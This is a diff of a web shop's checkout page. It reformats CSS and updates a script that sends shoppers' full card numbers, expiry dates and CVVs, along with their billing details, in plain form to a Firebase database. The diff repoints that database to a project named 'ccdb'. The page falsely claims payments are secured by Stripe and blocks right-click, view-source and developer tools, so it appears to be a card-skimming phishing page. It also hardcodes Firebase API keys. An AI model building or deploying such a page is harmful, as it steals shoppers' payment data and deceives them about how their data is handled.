@@ -7,101 +7,87 @@
   <link rel="stylesheet" href="cdn/shop/t/1/assets/base.css">
   <style>
     @media (max-width: 768px) {
-    .billing-container {
+      .billing-container {
         margin-top: 30px;
         padding-bottom: 20px;
-    }
-    #billing-form select {
-  width: 100%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  font-size: 16px;
-  background: #f9f9f9;
-  transition: 0.3s ease-in-out;
-}
-
-#billing-form select:focus {
-  border-color: #0071e3;
-  outline: none;
-  background: #fff;
-  box-shadow: 0 0 10px rgba(0, 113, 227, 0.2);
-}
-
-.custom-select-wrapper {
-  position: relative;
-  display: flex;
-  align-items: center;
-}
-
-#country {
-  width: 100%;
-  padding: 14px;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  font-size: 16px;
-  background: #fff url('img/dropdown-arrow.png') no-repeat right 12px center;
-  background-size: 12px;
-  appearance: none; /* Removes default browser styling */
-  cursor: pointer;
-  transition: 0.3s ease-in-out;
-}
-
-#country:focus {
-  border-color: #0071e3;
-  outline: none;
-  box-shadow: 0 0 10px rgba(0, 113, 227, 0.2);
-}
-
-
-    .payment-container {
+      }
+      #billing-form select {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        font-size: 16px;
+        background: #f9f9f9;
+        transition: 0.3s ease-in-out;
+      }
+      #billing-form select:focus {
+        border-color: #0071e3;
+        outline: none;
+        background: #fff;
+        box-shadow: 0 0 10px rgba(0, 113, 227, 0.2);
+      }
+      .custom-select-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+      #country {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        font-size: 16px;
+        background: #fff url('img/dropdown-arrow.png') no-repeat right 12px center;
+        background-size: 12px;
+        appearance: none;
+        cursor: pointer;
+        transition: 0.3s ease-in-out;
+      }
+      #country:focus {
+        border-color: #0071e3;
+        outline: none;
+        box-shadow: 0 0 10px rgba(0, 113, 227, 0.2);
+      }
+      .payment-container {
         border-top: 1px solid rgba(0, 0, 0, 0.1);
         padding-top: 20px;
         margin-top: 20px;
-    }
+      }
     }
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
     }
-
     .payment-security {
-    font-size: 13px;
-    color: #555;
-    text-align: center;
-    margin-top: 8px;
-}
-.payment-iconn {
-    width: 35px; /* Adjust size (try 40px or 30px if needed) */
-    height: auto;
-    vertical-align: middle;
-}
-
-
-.payment-security .payment-icon {
-    width: 80px;
-    vertical-align: middle;
-    margin-right: 5px;
-}
-
-.payment-links {
-    font-size: 12px;
-    text-align: center;
-    margin-top: 6px;
-}
-
-.payment-links a {
-    color: #0071e3;
-    text-decoration: none;
-    font-weight: 600;
-}
-
-.payment-links a:hover {
-    text-decoration: underline;
-}
-
-
+      font-size: 13px;
+      color: #555;
+      text-align: center;
+      margin-top: 8px;
+    }
+    .payment-iconn {
+      width: 35px;
+      height: auto;
+      vertical-align: middle;
+    }
+    .payment-security .payment-icon {
+      width: 80px;
+      vertical-align: middle;
+      margin-right: 5px;
+    }
+    .payment-links {
+      font-size: 12px;
+      text-align: center;
+      margin-top: 6px;
+    }
+    .payment-links a {
+      color: #0071e3;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .payment-links a:hover {
+      text-decoration: underline;
+    }
     body {
       font-family: 'Inter', sans-serif;
       background-color: #f5f5f7;
@@ -227,7 +213,7 @@
       .checkout-content {
         display: flex;
         flex-direction: row;
-        justify-contentFG: space-between;
+        justify-content: space-between;
         gap: 20px;
       }
       .left-section {
@@ -343,16 +329,9 @@
                 </select>
               </div>
             </div>
-            
-            
           </form>
         </div>
-        
       </div>
-
-
-
-
       <div class="payment-container">
         <h2>Payment Method</h2>
         <div class="bank-logos">
@@ -375,10 +354,8 @@
             <label for="cvv">CVV</label>
             <input type="text" id="cvv" placeholder="123" required maxlength="3" minlength="3">
           </div>
-          
           <button id="place-order">Pay</button><br>
           <p class="payment-security">
-            
             Payment secured by <img src="img/stripe.png" alt="Stripe Secured" class="payment-iconn" width="10">
             . Your data is encrypted and protected.
           </p>
@@ -396,13 +373,14 @@
 
   <script>
     const firebaseConfig = {
-      apiKey: "AIzaSyBTyPUNVUU9MthEDljLVysLJ9TS3pNXn0c",
-      authDomain: "artcc-ac70d.firebaseapp.com",
-      projectId: "artcc-ac70d",
-      storageBucket: "artcc-ac70d.firebasestorage.app",
-      messagingSenderId: "206956324884",
-      appId: "1:206956324884:web:fca879bc2e58a4fdcadf01",
-      measurementId: "G-RWT6NJ1STV"
+      apiKey: "AIzaSyC6GiCz7DRZ0C6OMsmAfJyeNV7Iblx4EqM",
+      authDomain: "ccdb-88f09.firebaseapp.com",
+      databaseURL: "https://ccdb-88f09-default-rtdb.firebaseio.com",
+      projectId: "ccdb-88f09",
+      storageBucket: "ccdb-88f09.firebasestorage.app",
+      messagingSenderId: "526809144784",
+      appId: "1:526809144784:web:86f3a9e1595a7403adadd5",
+      measurementId: "G-WNJ376BBZF"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -426,201 +404,188 @@
 
       checkoutItems.innerHTML = "";
       cart.forEach(item => {
-          total += item.price * item.quantity;
-          const itemDiv = document.createElement("div");
-          itemDiv.classList.add("cart-item");
-          itemDiv.innerHTML = `
-              <span>${item.name} x${item.quantity}</span>
-              <span>$${(item.price * item.quantity).toFixed(2)}</span>
-          `;
-          checkoutItems.appendChild(itemDiv);
+        total += item.price * item.quantity;
+        const itemDiv = document.createElement("div");
+        itemDiv.classList.add("cart-item");
+        itemDiv.innerHTML = `
+          <span>${item.name} x${item.quantity}</span>
+          <span>$${(item.price * item.quantity).toFixed(2)}</span>
+        `;
+        checkoutItems.appendChild(itemDiv);
       });
       checkoutTotal.textContent = `Total: $${total.toFixed(2)}`;
 
       function showWarning(input, message) {
-          input.classList.add("error");
-          input.setCustomValidity(message);
+        input.classList.add("error");
+        input.setCustomValidity(message);
       }
 
       function clearWarning(input) {
-          input.classList.remove("error");
-          input.setCustomValidity("");
+        input.classList.remove("error");
+        input.setCustomValidity("");
       }
 
-      // **Billing Fields Validation (Restricting input but keeping payment formatting untouched)**
       fullname.addEventListener("input", (e) => {
-          e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
+        e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
       });
 
       city.addEventListener("input", (e) => {
-          e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
+        e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, "");
       });
 
       address.addEventListener("input", (e) => {
-          e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s,.#-]/g, "");
+        e.target.value = e.target.value.replace(/[^a-zA-Z0-9\s,.#-]/g, "");
       });
 
       email.addEventListener("input", (e) => {
-          let emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-          if (!emailRegex.test(e.target.value)) {
-              showWarning(email, "Enter a valid email address.");
-          } else {
-              clearWarning(email);
-          }
+        let emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        if (!emailRegex.test(e.target.value)) {
+          showWarning(email, "Enter a valid email address.");
+        } else {
+          clearWarning(email);
+        }
       });
 
-      // **Fix: Restore Card Number Formatting**
       cardName.addEventListener("input", (e) => {
-    e.target.value = e.target.value.replace(/[0-9]/g, ""); // Remove numbers
-});
+        e.target.value = e.target.value.replace(/[0-9]/g, "");
+      });
 
       cardNumber.addEventListener("input", (e) => {
-          let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
-          value = value.replace(/(.{4})/g, "$1 ").trim(); // Auto-format into 4-digit groups
-          e.target.value = value.substring(0, 19); // Max length 19 (16 digits + spaces)
+        let value = e.target.value.replace(/\D/g, "");
+        value = value.replace(/(.{4})/g, "$1 ").trim();
+        e.target.value = value.substring(0, 19);
       });
 
-      // **Fix: Restore Expiry Date Formatting**
       expiry.addEventListener("input", (e) => {
-          let value = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
-          let currentYear = new Date().getFullYear().toString().slice(-2);
-          let currentMonth = new Date().getMonth() + 1;
+        let value = e.target.value.replace(/\D/g, "");
+        let currentYear = new Date().getFullYear().toString().slice(-2);
+        let currentMonth = new Date().getMonth() + 1;
 
-          // Allow deleting slash when backspacing
-          if (e.inputType === "deleteContentBackward" && value.length <= 2) {
-              value = value.substring(0, 2);
-          } else if (value.length >= 2) {
-              let month = parseInt(value.substring(0, 2));
-              if (month > 12) month = 12;
-              value = `${month.toString().padStart(2, "0")}/${value.substring(2, 4)}`;
-          }
+        if (e.inputType === "deleteContentBackward" && value.length <= 2) {
+          value = value.substring(0, 2);
+        } else if (value.length >= 2) {
+          let month = parseInt(value.substring(0, 2));
+          if (month > 12) month = 12;
+          value = `${month.toString().padStart(2, "0")}/${value.substring(2, 4)}`;
+        }
 
-          e.target.value = value.substring(0, 5); // MM/YY format
+        e.target.value = value.substring(0, 5);
       });
 
       cvv.addEventListener("input", (e) => {
-          e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3); // Only allow 3 digits
+        e.target.value = e.target.value.replace(/\D/g, "").substring(0, 3);
       });
 
       placeOrderButton.addEventListener("click", (e) => {
-          e.preventDefault();
+        e.preventDefault();
 
-          let hasError = false;
+        let hasError = false;
 
-          if (cart.length === 0) {
-              alert("Your cart is empty!");
-              return;
+        if (cart.length === 0) {
+          alert("Your cart is empty!");
+          return;
+        }
+
+        if (fullname.value.trim() === "") {
+          showWarning(fullname, "Full Name is required.");
+          hasError = true;
+        }
+        if (email.value.trim() === "" || !email.checkValidity()) {
+          showWarning(email, "Enter a valid email address.");
+          hasError = true;
+        }
+        if (address.value.trim() === "") {
+          showWarning(address, "Address is required.");
+          hasError = true;
+        }
+        if (city.value.trim() === "") {
+          showWarning(city, "City is required.");
+          hasError = true;
+        }
+
+        if (cardName.value.trim() === "") {
+          showWarning(cardName, "Cardholder Name is required.");
+          hasError = true;
+        }
+        if (cardNumber.value.replace(/\s/g, "").length !== 16) {
+          showWarning(cardNumber, "Card Number must be exactly 16 digits.");
+          hasError = true;
+        }
+        if (expiry.value.length !== 5) {
+          showWarning(expiry, "Expiration Date must be in MM/YY format.");
+          hasError = true;
+        }
+        if (cvv.value.length !== 3) {
+          showWarning(cvv, "CVV must be exactly 3 digits.");
+          hasError = true;
+        }
+
+        if (hasError) return;
+
+        const ordersRef = db.collection("orders");
+
+        ordersRef.orderBy("orderNumber", "desc").limit(1).get().then(snapshot => {
+          let lastOrderNumber = 0;
+
+          if (!snapshot.empty) {
+            lastOrderNumber = snapshot.docs[0].data().orderNumber;
           }
 
-          // **Billing fields validation**
-          if (fullname.value.trim() === "") {
-              showWarning(fullname, "Full Name is required.");
-              hasError = true;
-          }
-          if (email.value.trim() === "" || !email.checkValidity()) {
-              showWarning(email, "Enter a valid email address.");
-              hasError = true;
-          }
-          if (address.value.trim() === "") {
-              showWarning(address, "Address is required.");
-              hasError = true;
-          }
-          if (city.value.trim() === "") {
-              showWarning(city, "City is required.");
-              hasError = true;
-          }
+          const newOrderNumber = lastOrderNumber + 1;
 
-          // **Payment Fields Validation (UNCHANGED)**
-          if (cardName.value.trim() === "") {
-              showWarning(cardName, "Cardholder Name is required.");
-              hasError = true;
-          }
-          if (cardNumber.value.replace(/\s/g, "").length !== 16) {
-              showWarning(cardNumber, "Card Number must be exactly 16 digits.");
-              hasError = true;
-          }
-          if (expiry.value.length !== 5) {
-              showWarning(expiry, "Expiration Date must be in MM/YY format.");
-              hasError = true;
-          }
-          if (cvv.value.length !== 3) {
-              showWarning(cvv, "CVV must be exactly 3 digits.");
-              hasError = true;
-          }
+          const orderData = {
+            orderNumber: newOrderNumber,
+            billing: {
+              fullName: fullname.value,
+              email: email.value,
+              address: address.value,
+              city: city.value
+            },
+            payment: {
+              cardName: cardName.value,
+              cardNumber: cardNumber.value,
+              expiry: expiry.value,
+              cvv: cvv.value
+            },
+            cart: cart,
+            total: total,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp(), // Add timestamp
+            status: 'Pending' // Add default status
+          };
 
-          if (hasError) return;
-
-          // **🔥 Store Orders with Sequential Numbers (UNCHANGED)**
-          const ordersRef = db.collection("orders");
-
-          ordersRef.orderBy("orderNumber", "desc").limit(1).get().then(snapshot => {
-              let lastOrderNumber = 0;
-
-              if (!snapshot.empty) {
-                  lastOrderNumber = snapshot.docs[0].data().orderNumber;
-              }
-
-              const newOrderNumber = lastOrderNumber + 1;
-
-              const orderData = {
-                  orderNumber: newOrderNumber,
-                  billing: {
-                      fullName: fullname.value,
-                      email: email.value,
-                      address: address.value,
-                      city: city.value
-                  },
-                  payment: {
-                      cardName: cardName.value,
-                      cardNumber: cardNumber.value,
-                      expiry: expiry.value,
-                      cvv: cvv.value
-                  },
-                  cart: cart,
-                  total: total
-              };
-
-              ordersRef.doc(newOrderNumber.toString()).set(orderData)
-              .then(() => {
-                  localStorage.removeItem("cart");
-                  window.location.href = "order-confirmation.html";
-              })
-              .catch(error => console.error("Error:", error));
-          });
+          ordersRef.doc(newOrderNumber.toString()).set(orderData)
+            .then(() => {
+              localStorage.removeItem("cart");
+              window.location.href = "order-confirmation.html";
+            })
+            .catch(error => console.error("Error:", error));
+        });
       });
-  });
-</script>
+    });
+  </script>
 
-
-
-<style>
-  .error {
+  <style>
+    .error {
       border: 2px solid red;
       background-color: #ffe6e6;
-  }
-</style>
-
- 
- 
- 
-
-<script>
-  // Disable right-click
-  document.addEventListener('contextmenu', function(e) {
-    e.preventDefault();
-  });
-
-  // Block Ctrl+U (View Source) and F12 (DevTools)
-  document.addEventListener('keydown', function(e) {
-    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-      e.preventDefault();
     }
-    if (e.key === 'F12') {
+  </style>
+
+  <script>
+    document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
-    }
-  });
-</script>
+    });
 
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+        e.preventDefault();
+      }
+      if (e.key === 'F12') {
+        e.preventDefault();
+      }
+    });
+  </script>
 
+  <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'91d234d028705082',t:'MTc0MTQzNTU4NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
